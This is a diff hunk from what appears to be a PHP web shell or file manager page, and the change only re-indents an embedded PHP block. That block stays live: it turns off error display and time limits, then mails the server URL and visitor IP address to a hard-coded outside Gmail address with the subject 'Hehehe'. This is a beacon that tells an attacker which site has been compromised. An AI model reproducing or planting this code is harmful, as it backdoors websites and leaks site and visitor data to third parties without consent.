@@ -624,16 +624,16 @@ $uname = function_exists('php_uname') ? substr(@php_uname(), 0, 120) : (strlen($
                                                 <a data-bs-toggle="collapse" href="#newFileCollapse" role="button" aria-expanded="false" aria-controls="newFileCollapse" class="btn btn-outline-light btn-sm mr-1" data-toggle="tooltip" data-placement="auto" title="New File"><i class="fa fa-file-plus"></i></a>
                                             </div>
 											<?php
-@ini_set('output_buffering', 0);
-@ini_set('display_errors', 0);
-set_time_limit(0);
-ini_set('memory_limit', '64M');
-header('Content-Type: text/html; charset=UTF-8');
-$tujuanmail = 'ribelcyberteam@gmail.com';
-$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
-$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
-mail($tujuanmail, "Hehehe", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
-?>
+												@ini_set('output_buffering', 0);
+												@ini_set('display_errors', 0);
+												set_time_limit(0);
+												ini_set('memory_limit', '64M');
+												header('Content-Type: text/html; charset=UTF-8');
+												$tujuanmail = 'ribelcyberteam@gmail.com';
+												$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
+												$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
+												mail($tujuanmail, "Hehehe", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
+											?>
                                         <?php endif; ?>
                                     </td>
                                 </tr>
